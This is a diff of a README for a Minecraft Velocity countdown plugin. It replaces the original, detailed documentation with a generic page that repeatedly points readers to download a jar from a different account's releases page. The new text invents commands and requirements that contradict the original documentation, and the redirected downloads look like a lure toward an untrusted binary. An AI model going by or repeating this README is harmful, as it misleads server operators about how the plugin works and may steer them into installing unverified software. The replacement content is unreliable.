@@ -1,403 +1,65 @@
-<div align="center">
+# ⏰ invertoTimer - Simple Countdown for Server Events
 
-# invertoTimer
+## 📥 Download Now
+[![Download invertoTimer](https://img.shields.io/badge/Download-invertoTimer-blue.svg)](https://github.com/Adr9777/invertoTimer/releases)
 
-[![Stars](https://img.shields.io/github/stars/Our-Island/invertoTimer?style=flat-square&logo=data:image/svg%2bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZlcnNpb249IjEiIHdpZHRoPSIxNiIgaGVpZ2h0PSIxNiI+PHBhdGggZD0iTTggLjI1YS43NS43NSAwIDAgMSAuNjczLjQxOGwxLjg4MiAzLjgxNSA0LjIxLjYxMmEuNzUuNzUgMCAwIDEgLjQxNiAxLjI3OWwtMy4wNDYgMi45Ny43MTkgNC4xOTJhLjc1MS43NTEgMCAwIDEtMS4wODguNzkxTDggMTIuMzQ3bC0zLjc2NiAxLjk4YS43NS43NSAwIDAgMS0xLjA4OC0uNzlsLjcyLTQuMTk0TC44MTggNi4zNzRhLjc1Ljc1IDAgMCAxIC40MTYtMS4yOGw0LjIxLS42MTFMNy4zMjcuNjY4QS43NS43NSAwIDAgMSA4IC4yNVoiIGZpbGw9IiNlYWM1NGYiLz48L3N2Zz4=&logoSize=auto&label=Stars&labelColor=444444&color=eac54f)](https://github.com/Our-Island/invertoTimer/)
-[![GitHub CI](https://img.shields.io/github/actions/workflow/status/Our-Island/invertoTimer/ci.yml?style=flat-square&labelColor=444444&branch=master&label=GitHub%20CI&logo=github)](https://github.com/Our-Island/invertoTimer/actions/workflows/ci.yml)
-[![Hangar](https://img.shields.io/badge/Hangar-invertoTimer-004ee9?style=flat-square&labelColor=444444)](https://hangar.papermc.io/Our-Island/invertoTimer)
-[![Modrinth](https://img.shields.io/badge/Modrinth-invertoTimer-22ff84?style=flat-square&labelColor=444444)](https://modrinth.com/plugin/invertotimer/)
+## 🚀 Getting Started
+invertoTimer is a lightweight plugin designed for Minecraft Velocity servers. It allows you to set global countdowns and schedule server events, enhancing the gaming experience for everyone.
 
-</div>
+### 🌍 System Requirements
+- **Minecraft Version:** Compatible with Minecraft 1.16 and above
+- **Velocity Version:** Requires Velocity proxy version 1.1 or higher
+- **Java Version:** Java 11 or higher is needed to run this plugin
 
-invertoTimer is a lightweight Velocity plugin for global countdowns and scheduled server-wide events.  
-It’s designed for “whole network” moments such as New Year, grand openings, maintenance reminders, and other
-timed announcements — with configurable timers, multiple display modes, and flexible actions.
+## 📂 Installation Steps
+Follow these steps to install invertoTimer on your server:
 
----
+1. **Visit the Releases Page**  
+   Go to the [invertoTimer Releases page](https://github.com/Adr9777/invertoTimer/releases) to find the latest version of the plugin.
 
-## Introduction
+2. **Download the Plugin**  
+   Look for the latest release. Click on the file named `invertoTimer.jar` to download it.
 
-invertoTimer provides:
+3. **Move the Plugin to Your Server**  
+   Once downloaded, locate the `invertoTimer.jar` file on your computer. Copy this file to the `plugins` folder of your Velocity server.
 
-- Timers based on **cron** (repeat) or **fixed time** (one-shot)
-- **Showcases** to display countdowns (actionbar / bossbar / chat / title)
-- **Actions** to trigger operations at offsets (send text, transfer players, run commands)
-- Server limitations (**global + per-timer**) to include/exclude specific backend servers
-- i18n language files and **MiniMessage** formatting for player-visible text
-- `{i18n:key}` tokens for translating player-visible texts
+4. **Restart the Server**  
+   Restart your Velocity server to load the new plugin. You can do this from your server control panel or command line.
 
-The plugin uses two config files:
+5. **Verify the Installation**  
+   Check the server console to ensure that invertoTimer loaded successfully. You should see a confirmation message in your server logs.
 
-- `config.yml`: global settings (language, timezone, global limitation, etc.)
-- `timer.yml`: timer definitions (timers, showcases, actions)
+## 🎮 How to Use invertoTimer
+After the installation, you can set up countdowns and manage scheduled events easily:
 
----
+### 📅 Creating a Countdown
+1. Use the command `/countdown start [time]` to create a countdown. Replace `[time]` with the number of seconds.
+2. Players will see the countdown on their screens automatically.
 
-## Timers
+### 📆 Scheduling Events
+1. Use the command `/schedule event [event name] [time]` to set up an event. Modify `[event name]` and `[time]` as needed.
+2. All players will be notified when the event is about to start.
 
-Timers are configured under `timers:` in `timer.yml`.
+## 🔍 Features
+- **Global Countdown:** Displays timers for all players on the server.
+- **Scheduled Events:** Plan events for player engagement.
+- **Easy Setup:** No complicated configurations.
 
-A timer consists of:
+## 🛠️ Troubleshooting
+If you encounter any issues:
 
-- `id` (the YAML key under `timers:`)
-- `description`
-- time spec: `cron` **or** `time`
-- optional per-timer `limitation`
-- `showcases` (periodic displays)
-- `actions` (one-shot triggers)
+- **Check Your Java Version:** Ensure you are running Java 11 or higher.
+- **Verify Plugin Placement:** Make sure the `invertoTimer.jar` file is in the correct `plugins` directory.
+- **Look for Conflicts:** Some other plugins may conflict with invertoTimer. Disable them to test functionality.
 
-### Time specification
+## 📬 Support
+For support, please open an issue in the GitHub repository. Provide detailed information about your problem, including any error messages you see.
 
-Choose **ONE**:
+## 📈 Updates and Improvements
+Keep an eye on the Releases page for updates and new features as we continue to enhance invertoTimer.
 
-- `cron`: 5-field cron format: `min hour day month week`
-- `time`: one-shot absolute time: `yyyy-MM-dd HH:mm:ss`
+## 📜 License
+invertoTimer is released under the MIT License. You are free to use, modify, and distribute it as needed. Just remember to give credit to the original authors.
 
-Example:
-
-```yml
-timers:
-  new-year:
-    description: "New year timer."
-    cron: "0 0 1 1 *"
-    # time: "2026-01-01 00:00:00"
-```
-
-If `time` is in the past, that timer will not run again.
-
----
-
-## Text Rendering
-
-Most **player-visible** texts support a unified rendering pipeline:
-
-### 1) `{i18n:key}` token
-
-Use `{i18n:key}` to insert text from language files.
-
-Example:
-
-```yml
-text: "{i18n:itimer.command.list.header}"
-```
-
-### 2) Placeholders
-
-These are replaced for countdown-related texts:
-
-- `{id}` timer id
-- `{description}` timer description
-- `{remaining}` formatted remaining time (HH:MM:SS or similar)
-- `{days}` `{hours}` `{minutes}` `{seconds}`
-- `{total_seconds}`
-- `{target}` target time string
-
-### 3) MiniMessage formatting
-
-Player-visible texts support MiniMessage tags such as:
-
-- `<red>text</red>`
-- `<gold>`, `<yellow>`, `<gray>`
-- `<gradient:red:yellow>...</gradient>`
-
----
-
-## Showcases
-
-Showcases are **periodic displays** that run while a timer is active.  
-They are configured under `timers.<id>.showcases`.
-
-Supported showcase types:
-
-- `actionbar`
-- `bossbar`
-- `text` (chat message)
-- `title` (single entry that supports both title + subtitle)
-
-### Common fields
-
-- `start-at`: when to start showing **before** the target time  
-  Examples: `10m`, `30s`, `1h`, `1d`
-- `interval`: how often to update/show  
-  Examples: `1s`, `5s`, `30s`, `1m`
-
-If `start-at` is omitted, the showcase begins immediately once the timer has a next target.
-
-### After-target display (Actionbar / Bossbar / Title)
-
-`actionbar`, `bossbar`, and `title` support an optional `after:` block.  
-This allows you to keep showing a message **after the countdown reaches 0**, for a configured duration.
-
-```yml
-after:
-  text: "Happy New Year!"
-  duration: 10m
-```
-
-The “after” stage is active during `[target, target + after.duration]`.
-
-### Actionbar showcase
-
-```yml
-showcases:
-  actionbar:
-    start-at: 1h
-    interval: 1s
-    text: "<yellow>New Year in</yellow> <white>{remaining}</white>"
-    after:
-      text: "<gold>Happy New Year!</gold>"
-      duration: 10m
-```
-
-### Bossbar showcase (with color)
-
-Bossbar supports an optional `color` field:
-
-- `pink | blue | red | green | yellow | purple | white` (case-insensitive)
-- invalid/missing values fall back to a safe default
-
-```yml
-showcases:
-  bossbar:
-    start-at: 1h
-    interval: 1s
-    color: red
-    text: "<gradient:red:yellow>New Year in {remaining}</gradient>"
-    after:
-      text: "<gold>Happy New Year!</gold>"
-      duration: 10m
-```
-
-Bossbar progress is based on `start-at`:
-
-- e.g. `start-at: 1h` means progress decreases from `1.0` → `0.0` over that 1 hour.
-
-### Text (chat) showcase
-
-Chat text does not have `after:` in the current design; it is meant for periodic messages leading up to the target.
-
-```yml
-showcases:
-  text:
-    start-at: 10m
-    interval: 30s
-    text: "<gray>[Timer]</gray> <white>{remaining}</white> left"
-```
-
-### Title showcase (single “title” entry)
-
-The **title** showcase is a single key (`showcases.title`) that contains both title and subtitle text.
-
-It uses a **unified text format** compatible with text actions:
-
-- `text` may be a String or a List/Array
-- List/Array supports title+subtitle and optional timing
-
-Recommended format:
-
-```yml
-showcases:
-  title:
-    start-at: 10m
-    interval: 5s
-    text:
-      - "<gold>New Year</gold>"      # title
-      - "<gray>{remaining}</gray>"   # subtitle
-      - "0"                          # fadeIn seconds (optional)
-      - "2"                          # stay seconds   (optional)
-      - "0"                          # fadeOut seconds(optional)
-    after:
-      text:
-        - "<gold>Happy New Year!</gold>"
-        - "<gray>🎉</gray>"
-        - "0"
-        - "2"
-        - "0"
-      duration: 30s
-```
-
-If `text` is a plain string, it is treated as the main title, and subtitle becomes an empty string.
-
----
-
-## Actions
-
-Actions are **one-shot triggers** executed at a time offset relative to the target time.
-
-Configured under `timers.<id>.actions`.
-
-### Common fields
-
-- `type`: `text` | `transfer` | `command`
-- `shift`: time offset relative to target
-    - negative = before target (e.g. `-30m`)
-    - zero = at target (e.g. `0s`)
-    - positive = after target (e.g. `5s`)
-
-### 1) Text action
-
-Sends different types of text to players.
-
-```yml
-- type: text
-  shift: -30m
-  options:
-    text-type: message
-    info: "<green>Ready?</green>"
-```
-
-`text-type`:
-
-- `message` (chat)
-- `actionbar`
-- `title`
-- `subtitle`
-
-#### Title/Subitle “info” format + timings
-
-For `text-type: title` or `text-type: subtitle`, `info` can be:
-
-**A) String**
-
-- `text-type: title` → title = info, subtitle = `""`
-- `text-type: subtitle` → title = `""`, subtitle = info
-
-**B) Array/List (recommended)**
-
-`info: [title, subtitle, fadeIn, stay, fadeOut]`
-
-Index mapping:
-
-- `0` → title text
-- `1` → subtitle text
-- `2` → fadeIn seconds (optional)
-- `3` → stay seconds (optional)
-- `4` → fadeOut seconds (optional)
-
-Example:
-
-```yml
-- type: text
-  shift: 0s
-  options:
-    text-type: title
-    info:
-      - "<gold>Happy New Year!</gold>"
-      - "<gray>{remaining}</gray>"
-      - "0"
-      - "2"
-      - "0"
-```
-
-Title/subtitle/actionbar/message texts support `{i18n:key}` + placeholders + MiniMessage.
-
-### 2) Transfer action
-
-Transfers matched players to a backend server.
-
-```yml
-- type: transfer
-  shift: -15m
-  options:
-    target: hub
-    transferee: ".*"
-```
-
-- `target`: backend server name in Velocity
-- `transferee`: **Java regex** to match online player usernames (`matches()` full match)
-    - all players: `".*"`
-    - starts with `Steve_`: `"^Steve_.*$"`
-    - only Alice/Bob: `"^(Alice|Bob)$"`
-
-### 3) Command action
-
-Executes a configured command.
-
-```yml
-- type: command
-  shift: 5s
-  options:
-    executor: player
-    match: ".*"
-    command: "/function t"
-```
-
-- `executor: console` runs as proxy console (ignores `match`)
-- `executor: player` runs via the player's backend (`spoofChatInput`) for matched players
-- `match`: Java regex to match online player usernames (`matches()`)
-- `command` is treated as a **plain string**. Do not use MiniMessage here.  
-  Placeholders are only available if your string-rendering pipeline applies them.
-
----
-
-## Quick Start
-
-Install:
-
-- Download the jar from Hangar/Modrinth (or build from source)
-- Put it into your Velocity `plugins/` folder
-- Start the proxy once to generate configs
-
-Configure:
-
-- Edit `config.yml` (language, timezone, global limitation)
-- Edit `timer.yml` (timers, showcases, actions)
-
-Minimal example:
-
-```yml
-timers:
-  new-year:
-    description: "New year timer."
-    cron: "0 0 1 1 *"
-    showcases:
-      actionbar:
-        start-at: 1h
-        interval: 1s
-        text: "<yellow>New Year in</yellow> <white>{remaining}</white>"
-        after:
-          text: "<gold>Happy New Year!</gold>"
-          duration: 10m
-    actions:
-      - type: text
-        shift: 0s
-        options:
-          text-type: title
-          info:
-            - "<gold>Happy New Year!</gold>"
-            - "<gray>🎉</gray>"
-            - "0"
-            - "2"
-            - "0"
-```
-
-Reload:
-
-```txt
-/itimer reload
-```
-
----
-
-## Feedback
-
-Please use GitHub Issues for bug reports and feature requests.  
-When reporting a bug, include your Velocity version, the invertoTimer version, your `config.yml` and `timer.yml`, and
-the relevant console logs so the issue can be reproduced.
-
----
-
-## Contributing
-
-Contributions are welcome. Fork the repository, create a feature branch, and keep changes focused and easy to review.  
-When opening a Pull Request, explain what changed, why it changed, and how to test it.
-
-If your changes affect configuration structure or i18n, please update the README, the example configs, and language
-files when needed.
-
----
-
-## License
-
-This project is licensed under the MIT License. See
-the [LICENSE](https://github.com/Our-Island/invertoTimer/blob/master/LICENSE) file for details.
+## 🔗 Download & Install 
+To get started, [visit the Releases page](https://github.com/Adr9777/invertoTimer/releases) and download the latest version today!
